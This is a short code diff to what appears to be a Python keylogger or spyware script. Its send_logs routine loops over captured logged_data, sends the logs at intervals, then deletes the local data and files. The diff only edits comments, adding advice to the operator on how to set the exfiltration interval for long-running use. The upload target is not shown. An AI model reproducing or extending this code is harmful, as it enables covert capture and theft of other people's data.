@@ -84,7 +84,7 @@ def send_logs():
 
 	#MIN = 10
 	#SECONDS = 1
-	#time.sleep(MIN * SECONDS) # every 10 mins write file/send log uncomment line 85-87 for this work
+	#time.sleep(MIN * SECONDS) # every 10 mins write file/send log uncomment from line 85-87 for this to work and for your preference this is for designed for long time durations 
 	time.sleep(20) #for the test 20 seconds is enough
 	while True:
 		if len(logged_data) > 1:
@@ -131,7 +131,7 @@ def send_logs():
 				print('delete data/files')
 
 				count += 1
-				time.sleep(20)
+				time.sleep(20) #if you want to change this keep the value of time same as in line 88 to prevent errors
 
 			except Exception as errorString:
 				print('[!] send_logs // Error.. ~ %s' % (errorString))
